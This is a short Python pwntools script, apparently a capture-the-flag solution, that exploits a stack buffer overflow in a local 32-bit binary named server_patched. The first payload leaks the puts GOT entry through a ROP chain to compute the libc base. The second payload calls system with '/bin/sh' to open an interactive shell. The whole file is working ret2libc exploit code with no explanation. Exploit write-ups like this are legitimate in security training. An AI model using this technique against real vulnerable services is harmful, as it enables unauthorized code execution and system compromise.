from pwn import *

p = process(['./server_patched'])

elf = ELF("./server_patched",checksec=False)
libc = ELF("./libc6_2.27-3ubuntu1_i386.so",checksec=False)

## elf func
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
main_ = elf.symbols['main']

offset = b'A'*60

payload = offset
payload += p32(puts_plt)
payload += p32(main_)
payload += p32(puts_got)

p.sendlineafter(b'text: ',payload)

p.recvuntil(b"address: ")
p.recvline()
p.recvline()
leak = u32(p.recv(4))
libc.address = leak - libc.symbols['puts']

# gdb.attach(p,gdbscript="""init-gef
# br *0x08048699""")

libc_system = libc.symbols['system']
libc_binsh = next(libc.search(b'/bin/sh\x00'))

log.success("Libc Base: " + hex(libc.address))
log.success("Libc System: " + hex(libc_system))
log.success("Libc Binsh: " + hex(libc_binsh))

payload = offset
payload += p32(libc_system)
payload += p32(0x080483b2) # ret
payload += p32(libc_binsh)

p.sendlineafter(b'text: ',payload)

p.interactive()